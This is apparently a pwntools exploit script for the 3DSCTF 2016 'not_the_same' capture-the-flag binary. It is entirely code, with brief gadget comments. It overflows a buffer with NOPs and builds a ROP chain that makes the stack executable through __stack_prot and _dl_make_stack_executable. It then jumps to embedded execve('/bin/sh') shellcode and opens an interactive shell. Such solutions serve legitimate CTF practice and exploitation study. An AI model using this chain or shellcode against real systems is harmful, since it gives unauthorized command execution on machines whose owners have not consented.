from pwn import *

elf = ELF('./not_the_same_3dsctf_2016')
#sh = remote('127.0.0.1', 1299)
sh = process('./not_the_same_3dsctf_2016')
#sh.recvuntil('... ')
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
rop = b'\x90' * 45
rop += p32(0x0806fcca) # pop edx,ret
rop += p32(0x080eafec) # __stack_prot
rop += p32(0x08048b0b) # pop eax,ret 
rop += p32(7) # 7
rop += p32(0x0805586b) # mov dword [edx], eax, ret
rop += p32(0x08048b0b) # pop eax, ret
rop += p32(0x080eafc8) # __libc_stack_end
rop += p32(0x0809ae10) # _dl_make_stack_executable
#rop += p32(0x080494f0) # __libc_csu_fini 栈平衡，32位不需要
rop += p32(0x080b9113) # push esp, ret
rop += shellcode
with open('payloadb.txt', 'wb') as f:
    f.write(rop)

sh.sendline(rop)
sh.interactive()
